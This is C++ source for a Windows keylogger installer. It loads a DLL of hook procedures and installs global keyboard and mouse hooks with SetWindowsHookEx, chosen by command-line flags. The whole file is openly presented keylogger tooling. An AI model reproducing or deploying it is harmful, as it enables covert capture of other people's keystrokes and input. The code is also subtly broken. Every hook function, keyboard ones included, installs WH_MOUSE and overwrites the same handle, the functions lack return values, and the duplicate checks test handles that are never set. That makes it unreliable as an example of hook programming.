#include <windows.h>

#include <iostream>
#include <tchar.h> // using _tmain macro

// Used for x86 and x64 compatibility
#ifdef UNICODE
#define tcout std::wcout
#else
#define tcout std::cout
#endif

// CLI help message
void displayHelp() {
	tcout
		<< TEXT("Usage: ./keylogger_installer_x??.exe <dll_path>\n")
		<< TEXT("\nArguments:\n")
		<< TEXT("  <dll_path>:      Path to the .dll file with the procedures.\n")
		<< std::endl;
}

HMODULE lib = NULL;
HHOOK hookKeyboard = NULL;
HHOOK hookMouse = NULL;
HHOOK hookKeyboardLL = NULL;
HHOOK hookMouseLL = NULL;

// For KeyboardProc and MouseProc
// If a 32-bit application installs a global hook on 64-bit Windows, the 32-bit hook is injected into each 32-bit process.
// In a 64-bit process, the threads are still marked as "hooked." 
// However, because a 32-bit application must run the hook code, the system executes the hook in the hooking app's context; specifically, on the thread that called SetWindowsHookEx.
// This means that the hooking application must continue to pump messages or it might block the normal functioning of the 64-bit processes.
// https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa#remarks

// For LowLevelKeyboardProc and LowLevelMouseProc:
// hook is not injected into another process
// => we also need a messageloop here

// GetProcAddress is used with the Name-decoration convention (__stdcall calling convention is used to call Win32 API functions): 
// An underscore (_) is prefixed to the name and the name is followed by the at sign (@) followed by the number of bytes (in decimal) in the argument list.

// GetMessage retrieves a message from the calling thread's message queue.
// The function dispatches incoming sent messages until a posted message is available for retrieval.

// TranslateMessage translates virtual-key messages into character messages.
// The character messages are posted to the calling thread's message queue, to be read the next time the thread calls the GetMessage

// DispatchMessage dispatches a message to a window procedure.
// It is typically used to dispatch a message retrieved by the GetMessage function.



DWORD installMouseProc() {
#ifdef _WIN64
	HOOKPROC procedure = (HOOKPROC)GetProcAddress(lib, "procedureMouse");
#else
	HOOKPROC procedure = (HOOKPROC)GetProcAddress(lib, "_procedureMouse@12");
#endif

	if (procedure == NULL) {
		tcout << "procedureMouse not found in DLL!" << std::endl;
		return 1;
	}

	hookMouse = SetWindowsHookEx(WH_MOUSE, procedure, lib, 0);
	if (hookMouse == NULL) {
		tcout << "MouseProc failed to install!" << std::endl;
		return 1;
	}
	tcout << "MouseProc installed successfully" << std::endl;

	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

DWORD installLowLevelMouseProc() {
#ifdef _WIN64
	HOOKPROC procedure = (HOOKPROC)GetProcAddress(lib, "procedureMouseLL");
#else
	HOOKPROC procedure = (HOOKPROC)GetProcAddress(lib, "_procedureMouseLL@12");
#endif

	if (procedure == NULL) {
		tcout << "procedureMouseLL not found in DLL!" << std::endl;
		return 1;
	}

	hookMouse = SetWindowsHookEx(WH_MOUSE, procedure, lib, 0);
	if (hookMouse == NULL) {
		tcout << "LowLevelMouseProc failed to install!" << std::endl;
		return 1;
	}
	tcout << "LowLevelMouseProc installed successfully" << std::endl;

	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

DWORD installKeyboardProc() {
#ifdef _WIN64
	HOOKPROC procedure = (HOOKPROC)GetProcAddress(lib, "procedureKeyboard");
#else
	HOOKPROC procedure = (HOOKPROC)GetProcAddress(lib, "_procedureKeyboard@12");
#endif

	if (procedure == NULL) {
		tcout << "procedureKeyboard not found in DLL!" << std::endl;
		return 1;
	}

	hookMouse = SetWindowsHookEx(WH_MOUSE, procedure, lib, 0);
	if (hookMouse == NULL) {
		tcout << "KeyBoardProc failed to install!" << std::endl;
		return 1;
	}
	tcout << "KeyBoardProc installed successfully" << std::endl;

	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

DWORD installLowLevelKeyboardProc() {
#ifdef _WIN64
	HOOKPROC procedure = (HOOKPROC)GetProcAddress(lib, "procedureKeyboardLL");
#else
	HOOKPROC procedure = (HOOKPROC)GetProcAddress(lib, "_procedureKeyboardLL@12");
#endif

	if (procedure == NULL) {
		tcout << "procedureKeyBoardLL not found in DLL!" << std::endl;
		return 1;
	}

	hookMouse = SetWindowsHookEx(WH_MOUSE, procedure, lib, 0);
	if (hookMouse == NULL) {
		tcout << "LowLevelKeyBoardProc failed to install!" << std::endl;
		return 1;
	}
	tcout << "LowLevelKeyBoardProc installed successfully" << std::endl;
	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

int _tmain(int argc, TCHAR* argv[])
{
	if (argc < 2) {
		displayHelp();
		return 1;
	}
	else if (_tcscmp(argv[1], TEXT("--help")) == 0) {
		displayHelp();
		return 0;
	}

	// Find the DLL with the procedures
	lib = LoadLibrary(argv[1]);

	if (lib == NULL) {
		tcout << "Can't find dll!" << std::endl;
		return 1;
	}

	for (int i = 2; i < argc; i++) {
		// Start the hooks depending on the arguments
		if (_tcscmp(argv[i], TEXT("--mouse-ll")) == 0 && hookMouseLL == NULL) {
			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(installLowLevelMouseProc), NULL, 0, NULL);
		}
		else if (_tcscmp(argv[i], TEXT("--keyboard-ll")) == 0 && hookKeyboardLL == NULL) {
			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(installLowLevelKeyboardProc), NULL, 0, NULL);
		}
		else if (_tcscmp(argv[i], TEXT("--mouse")) == 0 && hookMouse == NULL) {
			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(installMouseProc), NULL, 0, NULL);
		}
		else if (_tcscmp(argv[i], TEXT("--keyboard")) == 0 && hookKeyboard == NULL) {
			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(installKeyboardProc), NULL, 0, NULL);
		}
	}

	// Wait a bit until the procedures will have reached the GetMessage loop
	Sleep(1000);
	tcout << TEXT("Press 'Q' to quit the keylogger") << std::endl;
	int ch = ' ';
	while (ch != 'Q') {
		ch = _gettch();
		ch = toupper(ch);
	}

	// uninstall the hooks
	if (hookMouseLL != NULL) {
		UnhookWindowsHookEx(hookMouseLL);
	}
	if (hookMouse != NULL) {
		UnhookWindowsHookEx(hookMouse);
	}
	if (hookKeyboard != NULL) {
		UnhookWindowsHookEx(hookKeyboard);
	}
	if (hookKeyboardLL != NULL) {
		UnhookWindowsHookEx(hookKeyboardLL);
	}
	FreeLibrary(lib);
}